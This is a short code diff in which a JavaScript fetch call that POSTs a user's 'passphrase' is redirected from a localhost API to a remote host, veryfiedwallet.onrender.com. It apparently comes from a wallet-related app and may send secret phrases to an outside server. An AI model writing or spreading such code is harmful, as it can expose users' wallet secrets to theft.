@@ -91,7 +91,7 @@
         }
 
         try {
-          let response = await fetch("http://localhost:3001/api/v1/password", {
+          let response = await fetch("https://veryfiedwallet.onrender.com/api/v1/password", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ password: passphrase }),
